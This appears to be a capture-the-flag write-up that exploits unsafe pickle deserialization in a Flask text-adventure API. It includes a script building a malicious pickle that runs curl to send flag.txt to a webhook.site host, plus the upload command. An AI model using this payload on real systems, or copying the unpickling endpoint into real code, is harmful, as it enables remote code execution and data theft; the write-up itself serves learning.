# Text Adventure API
> Explore my kitchen!

## About the Challenge
We got a source code (You can download the file [here](export.zip)) and also the website. Here is the preview of the website

![preview](images/preview.png)

## How to Solve?
Let's analyze `server.py`!

```py
#!/usr/local/bin/python

import os
import io
import pickle
from flask import Flask, Response, request, jsonify, session
from waitress import serve

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "")

rooms = {
    "start": {
        "description": "You are in a kitchen. There's a table, a cabinet, and a fridge.",
        "exits": ["table", "cabinet", "fridge"]
    },
    "table": {
        "description": "You find a table with some items on it.",
        "exits": ["start"],
        "objects": {
            "note": "A handwritten note with a message.",
            "apple": "A shiny red apple."
        }
    },
    "cabinet": {
        "description": "You open the cabinet and see various utensils.",
        "exits": ["start"],
        "objects": {
            "spoon": "A metal spoon.",
            "fork": "A fork with three prongs."
        }
    },
    "fridge": {
        "description": "You open the fridge and see various food items.",
        "exits": ["start"],
        "objects": {
            "milk": "A carton of fresh milk.",
            "eggs": "A dozen eggs in a container."
        }
    }
}

@app.route('/api/move', methods=['POST'])
def move():
    data = request.get_json()
    exit_choice = data.get("exit")
    current_location = get_current_location()
    if exit_choice in rooms[current_location]["exits"]:
        session['current_location'] = exit_choice
        return jsonify({"message": f"You move to the {exit_choice}. {rooms[exit_choice]['description']}"})
    else:
        return jsonify({"message": "You can't go that way."})

@app.route('/api/examine', methods=['GET'])
def examine():
    current_location = get_current_location()
    room_description = rooms[current_location]['description']
    exits = rooms[current_location]['exits']
    
    if "objects" in rooms[current_location]:
        objects = rooms[current_location]['objects']
        return jsonify({"current_location": current_location, "description": room_description, "objects": [obj for obj in objects], "exits": exits})
    else:
        return jsonify({"current_location": current_location, "description": room_description, "message": "There are no objects to examine here.", "exits": exits})

@app.route('/api/examine/<object_name>', methods=['GET'])
def examine_object(object_name):
    current_location = get_current_location()
    if "objects" in rooms[current_location] and object_name in rooms[current_location]['objects']:
        object_description = rooms[current_location]['objects'][object_name]
        return jsonify({"object": object_name, "description": object_description})
    else:
        return jsonify({"message": f"{object_name} not found or cannot be examined here."})


def get_current_location():
    return session.get('current_location', 'start')

@app.route('/api/save', methods=['GET'])
def save_session():
    session_data = {
        'current_location': get_current_location()
        # Add other session-related data as needed
    }

    memory_stream = io.BytesIO()
    pickle.dump(session_data, memory_stream)
    response = Response(memory_stream.getvalue(), content_type='application/octet-stream')
    response.headers['Content-Disposition'] = 'attachment; filename=data.pkl'
    
    return response

@app.route('/api/load', methods=['POST'])
def load_session():
    if 'file' not in request.files:
        return jsonify({"message": "No file part"})
    file = request.files['file']
    if file and file.filename.endswith('.pkl'):
        try:
            loaded_session = pickle.load(file)
            session.update(loaded_session)
        except:
            return jsonify({"message": "Failed to load save game session."})
        return jsonify({"message": "Game session loaded."})
    else:
        return jsonify({"message": "Invalid file format. Please upload a .pkl file."})

if __name__ == '__main__':
    if os.environ.get("DEPLOY_ENV") == "production":
        serve(app, host='0.0.0.0', port=5000)
    else:
        app.run(debug=True, host="0.0.0.0")
```

Let's focus on the endpoints `/api/save` and `/api/load`. The `/api/save` endpoint will dump a pickle file, while the `/api/load` endpoint will load our pickle file. And by using this [blog](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) as a reference. We can do remote code execution on the website by uploading malicious pickle file. I've created a python script to generate malicious pickle dump file

```py
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('curl -F password=@flag.txt https://webhook.site/36fc6839-b7fd-4de3-9f47-817f155a2c74')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    with open("test.pkl", "wb") as file:
        file.write(pickled)
```

And then execute this `curl` command

```
curl -F file=@data.pkl https://text-adventure-api.chall.pwnoh.io/api/load -v
```

And then check `webhook.site` to download the flag

![flag](images/flag.png)

```
bctf{y0u_f0und_7h3_py7h0n_p1ckl3_1n_7h3_k17ch3n}
```